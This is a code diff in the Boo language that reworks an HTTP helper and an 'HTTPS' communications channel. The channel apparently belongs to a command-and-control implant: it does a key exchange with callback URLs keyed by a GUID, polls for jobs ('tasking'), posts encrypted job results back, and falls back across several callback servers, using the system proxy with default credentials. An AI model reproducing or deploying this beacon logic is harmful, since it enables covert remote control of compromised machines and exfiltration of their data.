@@ -1,30 +1,28 @@
 class Response:
-    private Request as WebRequest
+    private Response as WebResponse
 
-    def constructor(request as WebRequest):
-        Request = request
+    def constructor(response as WebResponse):
+        Response = response
 
     public Text:
         get:
-            response = Request.GetResponse()
-            reader = StreamReader(response.GetResponseStream())
+            reader = StreamReader(Response.GetResponseStream())
             data = reader.ReadToEnd()
             reader.Close()
-            response.Close()
-            Request.Abort()
+            Response.Close()
+            #Request.Abort()
             return data
 
     public Bytes:
         get:
             data = null
-            response = Request.GetResponse()
             using memstream = MemoryStream():
-                using reader = response.GetResponseStream():
+                using reader = Response.GetResponseStream():
                     reader.CopyTo(memstream)
                     data = memstream.ToArray()
                     reader.Close()
-            response.Close()
-            Request.Abort()
+            Response.Close()
+            #Request.Abort()
             return data
 
 
@@ -49,7 +47,7 @@ class Requests:
             r.Proxy = WebRequest.GetSystemWebProxy()
             r.Proxy.Credentials = CredentialCache.DefaultCredentials
 
-        return Response(r)
+        return Response(r.GetResponse())
 
     public def Post(url as Uri, payload as (byte)) as Response:
         r = WebRequest.Create(url)
@@ -66,34 +64,56 @@ class Requests:
         stream.Write(payload, 0, payload.Length)
         stream.Close()
 
-        return Response(r)
+        return Response(r.GetResponse())
 
     public def Post(url as Uri, payload as string) as Response:
         return Post(url, Encoding.UTF8.GetBytes(payload))
 
-class Comms:
-    public Name as string = "https"
-    public BaseUrl as Uri
-    public JobsUrl as Uri
+class HTTPS:
+    public Name as string = 'https'
+    public CallBackUrls as List = []
+    private _guid as Guid
     private Requests as Requests = Requests()
-    private Crypto as Crypto
 
-    def constructor(guid as string, url as string):
-        BaseUrl = Uri(urljoin(url, guid))
-        JobsUrl = Uri(urljoin(BaseUrl, '/jobs'))
+    public Guid:
+        set:
+            _guid = value
 
-    public def KeyExchange():
-        Crypto = Crypto()
-        r = Requests.Post(BaseUrl, Crypto.public_key)
-        Crypto.derive_key(r.Text)
+    public def SetCallBackUrl(Url as string):
+        CallBackUrls.Add(Url)
 
-    public def SendJobResults(results as string, job_id as string):
-        encrypted_results = Crypto.Encrypt(results)
-        job_url = Uri(urljoin(JobsUrl, "/$(job_id)"))
-        Requests.Post(job_url, encrypted_results)
+    public def KeyExchange(encryptedPubKey as (byte)) as (byte):
+        for url in CallBackUrls:
+            BaseUrl = Uri(urljoin(url, _guid))
+            try:
+                r = Requests.Post(BaseUrl, encryptedPubKey)
+                return r.Bytes
+            except e as Exception:
+                print "[Channel: $(Name) CallbackUrl: '$(url)'] Error performing key exchange: $(e.Message)"
 
-    public def GetJob() as JsonJob:
-        job = Requests.Get(JobsUrl).Bytes
-        if len(job):
-            decrypted_data = Encoding.UTF8.GetString(Crypto.Decrypt(job))
-            return JavaScriptSerializer().Deserialize[of JsonJob](decrypted_data)
+        raise CommsException("Unable to perform Kex operation using callback URLs")
+
+    public def SendJobResults(encryptedResults as (byte), jobId as string):
+        for url in CallBackUrls:
+            baseUrl = Uri(urljoin(url, _guid))
+            jobsUrl = Uri(urljoin(baseUrl, '/jobs'))
+            try:
+                jobUrl = Uri(urljoin(jobsUrl, "/$(jobId)"))
+                Requests.Post(jobUrl, encryptedResults)
+                return
+            except e as Exception:
+                print "[Channel: $(Name) CallbackUrl: '$(url)'] Error sending job results: $(e.Message)"
+
+        raise CommsException("Unable to perform SendJobResults() operation using callback URLs")
+
+    public def GetJob() as (byte):
+        for url in CallBackUrls:
+            baseUrl = Uri(urljoin(url, _guid))
+            jobsUrl = Uri(urljoin(baseUrl, '/jobs'))
+            try:
+                r = Requests.Get(jobsUrl)
+                return r.Bytes
+            except e as Exception:
+                print "[Channel: $(Name) CallbackUrl: '$(url)'] Error getting tasking: $(e.Message)"
+
+        raise CommsException("Unable to perform GetJob() operation using callback URLs")
